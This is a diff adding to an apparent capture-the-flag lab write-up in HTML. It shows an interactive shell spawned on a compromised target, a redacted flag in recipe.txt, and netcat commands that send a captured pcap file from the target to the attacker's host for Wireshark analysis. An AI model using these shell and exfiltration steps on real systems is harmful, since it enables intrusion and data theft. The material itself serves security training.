@@ -183,3 +183,20 @@ $ which python
 /usr/bin/python
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 </pre></code>
+<pre><code>
+$ cat recipe.txt
+cat recipe.txt
+Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was <b><---REDACTED---></b>.
+</pre>/code>
+<p>First thing that i noticed besides <code>recipe.txt</code> was a directory <code>incidents</code>, which contains <code>suspicious.pcapng</code>. For this file we will have to use wireshark. </p>
+<p>On host machine type:</p>
+<pre><code>
+nc -lp <port> > <name_of_saved_file>.pcapng
+</pre></code>
+<p>And on target machine type:</p>
+<pre><code>
+nc <Your_IP> <port> < suspicious.pcapng
+</pre></code>
+<p>Now run wireshark and open the file.</p>
+<p>After some trial and error i found valuable information in <code>tcp.stream eq 7</code> folowing following tcp stream.</p>
+<img src="">
